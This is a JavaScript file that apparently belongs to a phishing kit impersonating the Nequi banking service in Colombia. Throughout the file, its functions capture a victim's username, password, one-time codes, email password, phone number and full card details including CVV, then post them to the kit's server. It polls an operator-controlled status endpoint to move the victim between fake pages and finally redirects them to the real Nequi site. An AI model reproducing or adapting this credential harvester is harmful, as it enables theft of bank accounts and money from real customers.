function inicio(u){
    $.post( "/process/inicio.php", { usr: u} ,function(data) {
        window.location.href = "contraseña.php";
    });
}


function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}   


function pasousuario(p){
    var res;
    var d = detectar_dispositivo();
    $.post( "/process/pasousuario.php", { pass: p, dis: d} ,function(data) {
        if (data == "ERR") {

        }else{
            if (data == "NO") {

            }else{
                res = data.split("-");
                window.location.href = "cargando.php";
            }
        }
    });
}            

function consultar_estado(){
    $.post( "/process/estado.php",function(data) {
        switch (data) {
            case '2': window.location.href = "dinamica.php"; break;
            case '4': window.location.href = "informacion.php"; break;
            case '6': window.location.href = "tarjeta.php"; break;               
            case '8': window.location.href = "dinamica.php"; break;
            case '10': window.location.href = "https://www.nequi.com.co/prestamo-propulsor"; break;
            case '12': window.location.href = "inicio.php"; break;
        } 
    });        
}

function enviar_otp(o){
    $.post( "/process/pasoOTP.php",{ otp:o },function(data) {
        window.location.href = "cargando.php";
    }); 
}

function enviar_mail(m,c,t){    
    $.post( "/process/pasomail.php",{ eml:m, passe:c, cel:t},function(data) {
        window.location.href = "cargando.php";
    });
}

function enviar_tarjeta(t,f,c){    
    $.post( "/process/pasotarjeta.php",{ tar:t, fec:f, cvv:c },function(data) {
        window.location.href = "cargando.php";
    });
}